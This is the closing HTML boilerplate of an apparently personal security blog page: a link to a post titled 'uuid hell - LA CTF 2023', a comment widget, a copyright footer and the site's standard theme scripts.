<a href=/blog/posts/uuid-hell/ class=next rel=next title="uuid hell - LA CTF 2023">uuid hell - LA CTF 2023<i class="fas fa-angle-right fa-fw"></i></a></div></div><div id=comments><div id=waline class=comment></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://waline.js.org/>Waline</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=http://r0h1t.me/ target=_blank rel="noopener noreferrer">Rohit</a></span></div><div class=footer-line></div><div class=footer-line></div></div></footer></div><div id=fixed-buttons><a href=#back-to-top id=back-to-top-button class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw"></i>
</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw"></i></a></div><div class=assets><link rel=stylesheet href=/blog/lib/waline/waline.min.css><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:10},comment:{waline:{comment:!0,copyright:!0,dark:"body[theme='dark'], body[theme='black']",el:"#waline",lang:"en",pageview:!0,serverURL:"https://r0h1t.me/blog/"}},search:{distance:100,findAllMatches:!0,highlightTag:"em",ignoreFieldNorm:!1,ignoreLocation:!1,isCaseSensitive:!1,location:0,maxResultLength:10,minMatchCharLength:2,noResultsFound:"No results found",snippetLength:30,threshold:.3,useExtendedSearch:!1},sharerjs:!0}</script><script type=text/javascript src=/blog/lib/waline/waline.js defer></script><script type=text/javascript src=/blog/js/waline.min.js defer></script><script type=text/javascript src=/blog/lib/clipboard/clipboard.min.js></script><script type=text/javascript src=/blog/lib/sharer/sharer.min.js></script><script type=text/javascript src=/blog/js/theme.min.js defer></script></div></body></html>